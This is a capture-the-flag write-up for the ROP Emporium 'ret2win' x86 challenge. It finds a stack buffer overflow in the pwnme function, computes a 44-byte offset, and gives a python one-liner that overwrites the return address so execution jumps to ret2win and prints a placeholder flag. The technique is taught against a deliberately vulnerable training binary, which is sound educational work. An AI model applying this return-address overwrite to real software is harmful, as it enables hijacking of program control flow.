Firstly, we check out what functions are in the file. I used `info functions` in the debugger.

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x08048374  _init
0x080483b0  read@plt
0x080483c0  printf@plt
0x080483d0  puts@plt
0x080483e0  system@plt
0x080483f0  __libc_start_main@plt
0x08048400  setvbuf@plt
0x08048410  memset@plt
0x08048420  __gmon_start__@plt
0x08048430  _start
0x08048470  _dl_relocate_static_pie
0x08048480  __x86.get_pc_thunk.bx
0x08048490  deregister_tm_clones
0x080484d0  register_tm_clones
0x08048510  __do_global_dtors_aux
0x08048540  frame_dummy
0x08048546  main
0x080485ad  pwnme
0x0804862c  ret2win
```

So there's a couple interesting functions here: `pwnme` and `ret2win`. Next, I opened up Ghidra to check out what each functions do.

```c
void pwnme(void)
{
  undefined1 local_28 [32];
  
  memset(local_28,0,32);
  puts("For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffe r!");
  puts("What could possibly go wrong?");
  puts("You there, may I have your input please? And don\'t worry about null bytes, we\'re using read ()!\n");
  printf("> ");
  read(0,local_28,56);
  puts("Thank you!");
  return;
}
```

This is the `pwnme` function. This function initialize a 32-byte buffer. The function also reads in a 56-byte input. So we can overflow this buffer into the return address of the stack frame.

```c
void ret2win(void)
{
  puts("Well done! Here\'s your flag:");
  system("/bin/cat flag.txt");
  return;
}
```

This is the `ret2win` function. It pretty much just reads the flag and outputs it.

Disassembling the `ret2win` function gives us this:

```
(gdb) disas ret2win
Dump of assembler code for function ret2win:
   0x0804862c <+0>:     push   %ebp
   0x0804862d <+1>:     mov    %esp,%ebp
   0x0804862f <+3>:     sub    $0x8,%esp
   0x08048632 <+6>:     sub    $0xc,%esp
   0x08048635 <+9>:     push   $0x80487f6
   0x0804863a <+14>:    call   0x80483d0 <puts@plt>
   0x0804863f <+19>:    add    $0x10,%esp
   0x08048642 <+22>:    sub    $0xc,%esp
   0x08048645 <+25>:    push   $0x8048813
   0x0804864a <+30>:    call   0x80483e0 <system@plt>
   0x0804864f <+35>:    add    $0x10,%esp
   0x08048652 <+38>:    nop
   0x08048653 <+39>:    leave
   0x08048654 <+40>:    ret
End of assembler dump.
```

So the address for the `ret2win` function is `0x0804862c`. Now we need to figure out the buffer that allows us to overflow into the return address of the `pwnme` function. I used `cyclic` in the `pwndbg` to generate input and found that it takes 44 bytes to reach the return address of the `ret2win` function. So I crafted this payload:

```sh
python -c 'import sys; sys.stdout.buffer.write(b"A" * 44 + b"\x2c\x86\x04\x08")' | ./ret2win32
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
```
